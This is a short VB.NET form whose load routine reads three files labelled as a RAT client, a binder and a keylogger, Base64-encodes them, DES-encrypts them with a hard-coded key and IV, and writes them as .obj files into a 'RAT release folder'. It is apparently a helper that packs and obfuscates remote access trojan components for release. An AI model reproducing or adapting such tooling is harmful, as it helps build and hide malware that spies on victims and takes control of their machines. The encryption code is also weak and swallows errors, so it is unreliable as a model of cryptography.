Imports System.IO
Imports System.Security.Cryptography

Public Class Form1

   

    Private Shared Function Encrypt(ByVal strText As String, ByVal strEncrKey As String) As String
        Dim IV() As Byte = {&H12, &H34, &H56, &H78, &H90, &HAB, &HCD, &HEF}
        Try
            Dim bykey() As Byte = System.Text.Encoding.UTF8.GetBytes(Microsoft.VisualBasic.Left(strEncrKey, 8))
            Dim InputByteArray() As Byte = System.Text.Encoding.UTF8.GetBytes(strText)
            Dim des As New DESCryptoServiceProvider
            Dim ms As New MemoryStream
            Dim cs As New CryptoStream(ms, des.CreateEncryptor(bykey, IV), CryptoStreamMode.Write)
            cs.Write(InputByteArray, 0, InputByteArray.Length)
            cs.FlushFinalBlock()
            Return Convert.ToBase64String(ms.ToArray())
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Try

            Dim str As String = Nothing
            Dim Bytes() As Byte
            Bytes = My.Computer.FileSystem.ReadAllBytes("RAT client location")
            str = Convert.ToBase64String(Bytes)
            str = Encrypt(str, "&%#@?,:*")
            My.Computer.FileSystem.WriteAllText("RAT release folder\ST.obj", str, False)
            Bytes = Nothing
            str = Nothing
            Bytes = My.Computer.FileSystem.ReadAllBytes("Binder Location")
            str = Convert.ToBase64String(Bytes)
            str = Encrypt(str, "&%#@?,:*")
            My.Computer.FileSystem.WriteAllText("RAT release folder\BS.obj", str, False)
            Bytes = Nothing
            str = Nothing
            Bytes = My.Computer.FileSystem.ReadAllBytes("Keylogger Location")
            str = Convert.ToBase64String(Bytes)
            str = Encrypt(str, "&%#@?,:*")
            My.Computer.FileSystem.WriteAllText("RAT release folder\KL.obj", str, False)
            Bytes = Nothing
            str = Nothing

            Me.Close()
        Catch ex As Exception

        End Try
    End Sub
End Class
